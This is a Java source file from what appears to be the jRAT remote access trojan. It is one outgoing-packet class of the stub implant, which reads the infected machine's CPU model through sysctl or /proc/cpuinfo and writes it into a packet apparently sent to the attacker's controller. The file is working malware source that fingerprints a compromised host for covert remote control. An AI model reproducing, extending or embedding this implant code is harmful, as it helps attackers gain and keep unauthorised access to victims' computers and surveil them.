package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;
import java.io.File;
import java.util.List;

import com.redpois0n.oslib.OperatingSystem;
import com.redpois0n.oslib.Utils;


public class Packet19InitCPU extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		String cpu = "Unknown";
		
		try {
			OperatingSystem os = OperatingSystem.getOperatingSystem().getType();
			
			if (os == OperatingSystem.OSX) {
				cpu = Utils.readProcess(new String[] { "sysctl", "-n", "machdep.cpu.brand_string" }).get(0);
			} else if (os == OperatingSystem.BSD) {
				cpu = Utils.readProcess(new String[] { "sysctl", "-n", "hw.model" }).get(0);
			} else if (os == OperatingSystem.LINUX) {
				List<String> lines = Utils.readFile(new File("/proc/cpuinfo"));
				
				for (String line : lines) {
					if (line.toLowerCase().contains("model name")) {
						cpu = line.replace("\t", "").split(": ")[1].trim();
						break;
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		sw.writeLine(cpu);
	}

	@Override
	public short getPacketId() {
		return (byte) 19;
	}

}
